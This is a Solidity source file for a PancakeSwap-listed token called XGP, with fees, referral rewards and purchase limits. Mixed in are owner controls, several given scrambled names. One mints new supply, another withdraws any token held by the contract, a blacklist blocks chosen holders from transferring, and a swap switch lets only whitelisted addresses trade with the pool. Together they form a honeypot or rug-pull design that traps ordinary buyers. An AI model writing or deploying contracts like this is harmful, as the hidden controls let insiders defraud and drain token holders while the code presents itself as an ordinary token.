pragma solidity ^0.5.4;

interface IERC20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

contract Context {
    constructor () internal { }
    // solhint-disable-previous-line no-empty-blocks

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }
}

contract XGPaild is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint a, uint b) internal pure returns (uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }
    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint a, uint b) internal pure returns (uint) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }
    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

interface IPancakeRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IPancakeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

contract XGP is XGPaild, Context {
  using SafeERC20 for IERC20;
  using Address for address;
  using SafeMath for uint;

  mapping (address => bool) public includeusers;
  mapping (address => bool) public witeeArecipient;


    mapping (address => uint) private _balances;

    mapping (address => mapping (address => uint)) private _allowances;

    uint private _totalSupply;
    uint public maxSupply =  3999 * 1e6;
    function totalSupply() public view returns (uint) {
        return _totalSupply;
    }
    function balanceOf(address account) public view returns (uint) {
        return _balances[account];
    }
    function transfer(address recipient, uint amount) public returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view returns (uint) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transferFrom(address sender, address recipient, uint amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function increaseAllowance(address spender, uint addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
    function decreaseAllowance(address spender, uint subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    mapping(address => address) public inviter;

    mapping(address=>uint ) public selltime;
    uint public starttimes=0;
    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        if (isfeeblk) {
           require(blkddress[sender] == false, "ERC20:the blk address");
        }

        uint oamount= amount;
        uint ouseramount=balanceOf(sender);
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
           uint256 needburn;
        if (isfee) {
            if (sender ==pancakePair || recipient == pancakePair) {
                    if (iscanswap) {
                        if (sender ==pancakePair) {
                            require(witeeaddress[recipient], " recipient not witee  swap");
                        }
                        if (recipient ==pancakePair) {
                            require(witeeaddress[sender], " sender  not witee swap");
                        }
                    }

                if((witeeaddress[recipient]||witeeaddress[sender]) &&  isfeewhit) {

                } else {

                if(!isContract(recipient) &&isfee2 && sender ==pancakePair ) {

                     {
                        _topcheckin(recipient, amount);
                    }
                }

                if (!isContract(sender) && recipient == pancakePair && isfee3) {
                     {
                        require(oamount <= ouseramount * 5 / 10);
                        if (starttimes == 0) {
                            starttimes=block.timestamp;
                        }
                        if (sfee[0]) {
                         _topcheckout(sender, amount);
                        }
                    }
                }

                uint burnaa=amount.mul(3).div(100);
                _balances[address(this)] = _balances[address(this)].add(burnaa);
                if (balanceOf(burnAddress) < 3000 *1e6) {
                    _burn(address(this), burnaa);
                }
                   uint bback=amount.mul(2).div(100);
                if (isfee4) {
                    _balances[backropadress] = _balances[backropadress].add(bback);
               emit Transfer(sender, backropadress, bback);
                }


                 uint bback2=amount.mul(2).div(100);
                if (isfee5) {
                    _balances[pancakePair] = _balances[pancakePair].add(bback2);
               emit Transfer(sender, pancakePair, bback2);
                }
                
                if (isfee6) {
                _takeInviterFee(sender,recipient, amount);
                    amount=  amount.mul(90).div(100);
                } else {
                    amount=  amount.mul(93).div(100);
                }
                
             }

            } 
            
        }

        bool shouldSetInviter = balanceOf(recipient) == 0 && inviter[recipient] == address(0) 
                && !isContract(sender) && !isContract(recipient);
        if (shouldSetInviter) {
                inviter[recipient] = sender;
                emit Inviter(recipient, sender);
            }

        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
    event Inviter(address  to, address  upline);

    event InviterSend(address  to, address  upline, uint256 amount);

    function _takeInviterFee(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        address cur = sender;
        address scur;
        if (sender == pancakePair) {
            cur = recipient;
        } else if (recipient == pancakePair) {
            cur = sender;
        }
     //    emit NetSwap(cur ,tAmount);


        for (uint256 i = 0; i < 3; i++) {
            uint256 rate;
            if (i == 0) {
                rate = 10;
            } else if (i == 1) {
                rate = 10;
            }
            cur = inviter[cur];
            scur=cur;
            if (cur == address(0)) {
                cur = address(this);
                scur=cur;
            }
            if (scur!=address(0)) {
                uint256 curTAmount = tAmount.mul(rate).div(1000);
                _balances[scur] = _balances[scur].add(curTAmount);
                emit Transfer(sender, scur, curTAmount);
                emit InviterSend(sender, scur, curTAmount);
            }

        }
    }


   function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function _topcheckin(
        address recipient, uint256 amounts
    ) private {
        //usrbuys[recipient]+=amounts;
        amounts = amounts.mul(9).div(10);
        //require(usrbuys[recipient]<=20*1e6, " out 20");
        uint ns= balanceOf(recipient);
        if (block.timestamp-starttimes<86400) {
            usrbuys[0][recipient]+=amounts;
            require( usrbuys[0][recipient]<=1*1e6, " out 1 2");
            require(ns+amounts<=1*1e6, " out 1");
        } else if (block.timestamp-starttimes<86400*2) {
            usrbuys[1][recipient]+=amounts;
            require( usrbuys[1][recipient]<=2*1e6, " out 2 2");
            require(ns+amounts<=2*1e6, " out 2");
        } else if (block.timestamp-starttimes<86400*3) {
            usrbuys[2][recipient]+=amounts;
            require( usrbuys[2][recipient]<=3*1e6, " out 3 3");
            require(ns+amounts<=3*1e6, " out 3");
        } else {
            require(ns+amounts<=3*1e6, " out 3");

        }
    }

 function _topcheckout(
        address recipient, uint256 amounts
    ) private {
        //usrbuys[recipient]+=amounts;
        uint ns= balanceOf(recipient);
        if (block.timestamp-starttimes<86400) {
            usrbuys[0][recipient]+=amounts;
            require( usrbuys[0][recipient]<=1*1e6, " out 1 2");
        } else if (block.timestamp-starttimes<86400*2) {
            usrbuys[1][recipient]+=amounts;
            require( usrbuys[1][recipient]<=2*1e6, " out 2 2");
        } else if (block.timestamp-starttimes<86400*3) {
            usrbuys[2][recipient]+=amounts;
            require( usrbuys[2][recipient]<=3*1e6, " out 3 3");
        } 
    }

    function _XGPlxlf(address account, uint amount) internal {
        require(account != address(0), "ERC20: XGPlxlf to the zero address");
        require(_totalSupply.add(amount) <= maxSupply, "ERC20: cannot XGPlxlf over max supply");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
    }
    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        _balances[address(0)] = _balances[address(0)].add(amount);
        emit Transfer(account, address(0), amount);
    }
    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

  
  address public govn;
  mapping (address => bool) public hxgpers;

   address public all =0x2673f14Ab141949943f9e2061EAF98d7EEcEe425;// 
    address public burnAddress = address(0);

   address public backropadress =0xd8cf4Cb4CC06BbB1d3AF70Cb853543875db63677;// 

 uint256 public rr = 20*1e6;


 function getPrice2() public view returns(uint256 ){
      uint[] memory amounts;
        address[] memory path = new address[](2);
        path[0] = token0;
        path[1] = token1;
       amounts = PancakeRouter01.getAmountsIn(1000000000000000000, path);
       if (amounts.length>0) {
           return amounts[0];
       } else {
           return rr;
       }
       
  }




mapping (uint=>mapping(address => uint256)) public usrbuys;


  IPancakeRouter01 public PancakeRouter01;
  address public token0;
  address public token1;
  address public pancakePair; 

  bool public iscanswap=false;

  function setIscanswap( bool _tf) public {
      require(msg.sender == govn || hxgpers[msg.sender ], "!govn");
      iscanswap = _tf;
  }

bool public isfee=true;
  function setIsisfee( bool _tf) public {
      require(msg.sender == govn || hxgpers[msg.sender ], "!govn");
      isfee = _tf;
  }

  bool public isfee2=true;
  function setIsisfee2( bool _tf) public {
      require(msg.sender == govn || hxgpers[msg.sender ], "!govn");
      isfee2 = _tf;
  }
  

    bool public isfee3=true;
  function setIsisfee3( bool _tf) public {
      require(msg.sender == govn || hxgpers[msg.sender ], "!govn");
      isfee3 = _tf;
  }

    bool public isfee4=false;
  function setIsisfee4( bool _tf) public {
      require(msg.sender == govn || hxgpers[msg.sender ], "!govn");
      isfee4 = _tf;
  }

      bool public isfee5=true;
  function setIsisfee5( bool _tf) public {
      require(msg.sender == govn || hxgpers[msg.sender ], "!govn");
      isfee5 = _tf;
  }
    bool public isfee6=true;
  function setIsisfee6( bool _tf) public {
      require(msg.sender == govn || hxgpers[msg.sender ], "!govn");
      isfee6 = _tf;
  }

  bool[] public sfee=[true,false,true,true];
  function setsfee2( uint ype, bool _tf) public {
      require(msg.sender == govn || hxgpers[msg.sender ], "!govn");
      sfee[ype]= _tf;
  }
        bool public isfeewhit=true;
  function setisfeewhit( bool _tf) public {
      require(msg.sender == govn || hxgpers[msg.sender ], "!govn");
      isfeewhit = _tf;
  }


    bool public isfeeblk=true;
  function setisfeeblk( bool _tf) public {
      require(msg.sender == govn || hxgpers[msg.sender ], "!govn");
      isfeeblk = _tf;
  }
  

    function setwiteeaddress2(address[] memory _user) public {
      require(msg.sender == govn || hxgpers[msg.sender ], "!govn");
      for(uint i=0;i< _user.length;i++) {
          if (!witeeaddress[_user[i]]) {
              //
                witeeaa[witeelen] = _user[i];
                witeelen = witeelen+1;
                witeeaddress[_user[i]] = true;
          }
      }

  }



  
  constructor (address _usdt, address _pancake) public XGPaild("XGP", "XGP", 6) {
      govn = msg.sender;
      axgplker(msg.sender);

      _XGPlxlf(all, maxSupply);
      emit Transfer(address(0), all, maxSupply);
      witeeaddress[all] = true;
      witeeaddress[msg.sender] = true;

     PancakeRouter01 =  IPancakeRouter01(_pancake);
      token0 = address(this);
      token1 = _usdt;
      pancakePair =  IPancakeFactory(PancakeRouter01.factory())
            .createPair(address(this),token1 );  
  }

  function XGPlxlf(address account, uint amount) public {
      require(hxgpers[msg.sender], "!hxgpker");
      _XGPlxlf(account, amount);
  }

     function hpgfhxlk(uint256 amount, address ut) public
    {
         require(hxgpers[msg.sender], "hxgpker");
         IERC20(ut).transfer(msg.sender, amount);
    }

    function burn(uint256 amount) public {
        _burn(msg.sender, amount);
    }
  


  function setGovernance(address _govn) public {
      require(msg.sender == govn, "!govn");
      govn = _govn;
  }
  
  function axgplker(address _hxgpker) public {
      require(msg.sender == govn, "!govn");
      hxgpers[_hxgpker] = true;
  }

mapping (address => bool) public witeeaddress;
mapping (uint256=>address) public witeeaa;
uint256 public witeelen;


mapping (address => bool) public blkddress;
mapping (uint256=>address) public blkeeaa;
uint256 public blklen;

    function setremWteaddress(address _user) public {
      require(msg.sender == govn || hxgpers[msg.sender ], "!govn");
           if (witeeaddress[_user] ) {
                for (uint256 i=0;i<witeelen;i++ ) {
                    if (witeeaa[i] == _user) {
                        witeeaa[i]= witeeaa[witeelen-1];
                        witeelen = witeelen-1;
                        witeeaddress[_user] = false;
                        break;
                    }
                }
      }
  }

      function getwteUsers() public view returns(address[] memory ids) {

        address[] memory b1 = new  address[](witeelen);
        if (witeelen >0 ) {
            for (uint i=0;i<witeelen;i++ ) {
                b1[i] = witeeaa[i];
            }
        }
        return b1;
    }


function setblkddress2(address[] memory _user) public {
      require(msg.sender == govn || hxgpers[msg.sender ], "!govn");
      for(uint i=0;i< _user.length;i++) {
          if (!blkddress[_user[i]]) {
              //
                blkeeaa[blklen] = _user[i];
                blklen = blklen+1;
                blkddress[_user[i]] = true;
          }
      }

  }

      function setremblkaddress(address _user) public {
      require(msg.sender == govn || hxgpers[msg.sender ], "!govn");
           if (blkddress[_user] ) {
                for (uint256 i=0;i<blklen;i++ ) {
                    if (blkeeaa[i] == _user) {
                        blkeeaa[i]= blkeeaa[blklen-1];
                        blklen = blklen-1;
                        blkddress[_user] = false;
                        break;
                    }
                }
      }
  }

      function getblkUsers() public view returns(address[] memory ids) {

        address[] memory b1 = new  address[](blklen);
        if (blklen >0 ) {
            for (uint i=0;i<blklen;i++ ) {
                b1[i] = blkeeaa[i];
            }
        }
        return b1;
    }


}